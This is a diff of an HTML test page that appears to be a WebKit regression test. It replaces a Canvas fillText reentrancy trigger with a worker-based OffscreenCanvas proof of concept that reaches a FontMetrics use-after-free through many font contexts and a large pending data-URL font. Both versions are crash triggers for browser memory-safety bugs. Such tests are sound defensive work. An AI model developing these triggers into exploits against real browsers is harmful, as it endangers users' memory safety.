@@ -1,62 +1,62 @@
-<!-- Adaptado para exercitar o caminho do fillText no CanvasRenderingContext2D -->
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title>Canvas 2D fillText Font Metrics UAF Test</title>
+    <meta charset="UTF-8">
+    <title>WebKit OffscreenCanvas FontMetrics UAF Test Case</title>
 </head>
 <body>
-  <p>This test passes if it does not crash.</p>
+    <h1>WebKit FontMetrics Use-After-Free PoC</h1>
+    <p>Este teste valida a segurança de memória em measureTextInternal() com OffscreenCanvas em workers.</p>
+    <div id="status">Executando teste...</div>
 
-  <script>
+<script>
+// Teste baseado no commit 5ccd64b do WebKit
+const WORKER_BODY = `
+const dummies = [];
+for (let i = 0; i < 3500; i++) {
+    const dummy = new OffscreenCanvas(1, 1).getContext('2d');
+    dummy.font = '10px "dummy' + i + '"';
+    dummies.push(dummy);
+}
 
-    // 1. Registra a fonte customizada baseada no objeto FontFace
-    let face = new FontFace('MyTestFam', 'local(Helvetica)');
-    face.loaded.catch(() => {});
-    document.fonts.add(face);
+const pendingFontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
 
-    // 2. Obtém o contexto 2D do Canvas padrão
-    let canvas = document.createElement('canvas');
-    let context = canvas.getContext('2d');
+const keepAlive = [];
+for (let attempt = 0; attempt < 2; attempt++) {
+    const metricsDonor = new FontFace('metricsDonor' + attempt, pendingFontURL);
+    const measured = new FontFace('measured' + attempt, pendingFontURL, { unicodeRange: 'U+13A0-13FF' });
+    self.fonts.add(metricsDonor);
+    self.fonts.add(measured);
 
-    context.save();
-    context.lineWidth = 0.5;
+    const context = new OffscreenCanvas(64, 64).getContext('2d');
+    context.font = '10px metricsDonor' + attempt + ', measured' + attempt;
+    keepAlive.push(metricsDonor, measured, context);
 
-    // Define a fonte que acionará a resolução assíncrona/cache
-    context.font = '10px MyTestFam';
+    // Cherokee range para forçar o CodePath simples no WidthIterator
+    context.measureText('\\u13A0\\u13A2\\u13A4');
+}
+postMessage('done');
+`;
 
-    // 3. Intercepta o resolver de Promises (then) para forçar a reentrância
-    let reentered = false;
-    Object.defineProperty(FontFace.prototype, 'then', {
-      configurable: true,
-      get() {
-        if (reentered)
-          return undefined;
-
-        reentered = true;
-
-        // Reentrância: Realoca a pilha de estados (m_stateStack) na heap
-        // enquanto o processo interno de renderização/métricas do texto está em andamento.
-        for (let i = 0; i < 25; i++) {
-          context.save();
-          context.lineWidth = 1 + i;
+try {
+    const blob = new Blob([WORKER_BODY], { type: 'application/javascript' });
+    const worker = new Worker(URL.createObjectURL(blob));
+    
+    worker.onmessage = (event) => {
+        if (event.data === 'done') {
+            document.getElementById('status').innerText = 'Teste concluído com sucesso (sem crash).';
+            document.getElementById('status').style.color = 'green';
         }
+    };
 
-        reentered = false;
-
-        return function(resolve) {
-          if (typeof resolve === 'function') resolve();
-        };
-      }
-    });
-
-    // 4. Executa o fillText() com uma string mais longa/mista para forçar
-    // o percurso completo de glifos (WidthIterator) e disparar o uso das FontMetrics pós-width()
-    context.fillText('a_Test_String_12345_!@#$', 10, 50);
-
-    // Finalização do ciclo de teste
-    setTimeout(() => {
-    }, 200);
-  </script>
+    worker.onerror = (err) => {
+        document.getElementById('status').innerText = 'Erro no Worker: ' + err.message;
+        document.getElementById('status').style.color = 'red';
+    };
+} catch (e) {
+    document.getElementById('status').innerText = 'Erro ao inicializar o Worker ou OffscreenCanvas: ' + e.message;
+    document.getElementById('status').style.color = 'orange';
+}
+</script>
 </body>
 </html>
